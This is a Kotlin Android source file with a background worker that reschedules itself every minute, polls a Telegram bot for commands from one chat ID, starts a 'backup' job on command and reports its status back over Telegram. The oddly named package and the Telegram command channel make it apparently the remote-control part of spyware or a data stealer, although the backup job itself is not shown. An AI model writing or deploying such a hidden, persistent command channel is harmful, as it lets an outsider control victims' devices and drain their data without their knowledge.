package com.service.assasinscreed02

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit
import android.util.Log

class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "TelegramCommandWorker"
    }

    override fun doWork(): Result {
        try {
            Log.d(TAG, "Iniciando escucha de comandos de Telegram")
            
            val config = obtenerConfigBot(applicationContext)
            if (config == null) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return reprogramarWorker()
            }
            
            val (token, chatId) = config
            if (token.isBlank() || chatId.isBlank()) {
                Log.w(TAG, "Token o chat ID vacíos")
                return reprogramarWorker()
            }
            
            val url = "https://api.telegram.org/bot$token/getUpdates"
            val request = Request.Builder().url(url).build()
            
            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build()
                
            val response = client.newCall(request).execute()
            
            if (response.isSuccessful) {
                val body = response.body?.string() ?: ""
                if (body.isNotBlank()) {
                    procesarComandos(body, token, chatId)
                }
            } else {
                Log.w(TAG, "Error obteniendo updates: ${response.code}")
            }
            
            response.close()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error en TelegramCommandWorker: ${e.message}", e)
        }
        
        return reprogramarWorker()
    }
    
    private fun procesarComandos(jsonResponse: String, token: String, chatId: String) {
        try {
            val json = JSONObject(jsonResponse)
            if (!json.has("result")) {
                Log.w(TAG, "Respuesta de Telegram no contiene 'result'")
                return
            }
            
            val result = json.getJSONArray("result")
            for (i in 0 until result.length()) {
                try {
                    val update = result.getJSONObject(i)
                    val message = update.optJSONObject("message") ?: continue
                    val fromChatId = message.optJSONObject("chat")?.optString("id") ?: continue
                    val text = message.optString("text", "")
                    
                    if (fromChatId == chatId && text.isNotBlank()) {
                        procesarComando(text, token, chatId)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando mensaje: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando comandos: ${e.message}", e)
        }
    }
    
    private fun procesarComando(text: String, token: String, chatId: String) {
        when {
            text.contains("/iniciar_backup", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: iniciar_backup")
                try {
                    programarBackup(applicationContext, obtenerIntervalo(applicationContext).toLong())
                    enviarConfirmacionTelegram(token, chatId, "✅ Backup iniciado en el dispositivo.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error iniciando backup: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error iniciando backup: "+e.message)
                }
            }
            text.contains("/estado", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: estado")
                try {
                    val estado = obtenerEstadoBackup()
                    enviarConfirmacionTelegram(token, chatId, "📊 Estado del backup: $estado")
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estado: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estado: "+e.message)
                }
            }
        }
    }
    
    private fun obtenerEstadoBackup(): String {
        return try {
            val workInfos = WorkManager.getInstance(applicationContext)
                .getWorkInfosForUniqueWork("backup_trabajo")
                .get()
            
            if (workInfos.isEmpty()) {
                "Servicio detenido"
            } else {
                val estado = workInfos[0].state
                when (estado) {
                    androidx.work.WorkInfo.State.ENQUEUED -> "Servicio programado"
                    androidx.work.WorkInfo.State.RUNNING -> "Servicio ejecutándose"
                    androidx.work.WorkInfo.State.SUCCEEDED -> "Última ejecución exitosa"
                    androidx.work.WorkInfo.State.FAILED -> "Última ejecución fallida"
                    else -> "Estado: $estado"
                }
            }
        } catch (e: Exception) {
            "Error obteniendo estado: ${e.message}"
        }
    }
    
    private fun reprogramarWorker(): Result {
        try {
            val next = OneTimeWorkRequestBuilder<TelegramCommandWorker>()
                .setInitialDelay(1, TimeUnit.MINUTES)
                .build()
                
            WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                "telegram_command_listener",
                ExistingWorkPolicy.REPLACE,
                next
            )
            Log.d(TAG, "Worker reprogramado para ejecutarse en 1 minuto")
        } catch (e: Exception) {
            Log.e(TAG, "Error reprogramando worker: ${e.message}", e)
        }
        return Result.success()
    }
}

fun enviarConfirmacionTelegram(token: String, chatId: String, mensaje: String) {
    try {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = """
            {
                "chat_id": "$chatId",
                "text": "$mensaje"
            }
        """.trimIndent()

        val request = Request.Builder()
            .url(url)
            .post(body.toRequestBody("application/json".toMediaTypeOrNull()))
            .build()

        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build()

        val response = client.newCall(request).execute()
        if (response.isSuccessful) {
            Log.d("TelegramCommandWorker", "Mensaje enviado: $mensaje")
        } else {
            Log.w("TelegramCommandWorker", "Error enviando mensaje: ${response.code}")
        }
        response.close()
    } catch (e: Exception) {
        Log.e("TelegramCommandWorker", "Error enviando confirmación: ${e.message}", e)
    }
} 